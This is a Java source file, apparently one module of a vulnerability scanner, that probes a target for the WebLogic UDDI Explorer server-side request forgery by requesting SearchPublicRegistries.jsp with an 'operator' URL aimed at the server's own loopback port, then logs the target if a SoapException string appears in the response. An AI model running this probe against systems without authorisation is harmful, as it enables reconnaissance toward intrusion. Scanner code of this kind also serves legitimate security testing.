package action.url;

import tools.HttpConnectionUtils;
import tools.Logger;
import tools.StringMatcher;
import tools.UrlUtils;

public class WeblogicUddiSsrf {
	public void run(String target) {
		String targetHost = "";
		target = standardization(target);
		int port = UrlUtils.getPort(target);
		if (target.endsWith("/")) {
			targetHost = target+"uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:"+port+"&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search";
		} else {
			targetHost = target+"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:"+port+"&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search";
		}
		
		if (check(targetHost)) 
			Logger.getInstance().insertResult(target); 
	}
	
	public static String standardization(String target) {
		if (!target.startsWith("http"))
			target = "http://"+target;
		
		return target;
	}
	
	private boolean check(String targetHost) {
		HttpConnectionUtils utils = new HttpConnectionUtils();
		
		if (!utils.openConnection(targetHost, "GET"))
			return false;
		
		String result = utils.readAllResponse();
		if (result == null)
			return false;
		
		if (StringMatcher.findString(result, "weblogic.uddi.client.structures.exception.XML_SoapException", false)) {
        	return true;
		}
		
		return false;
	}
}
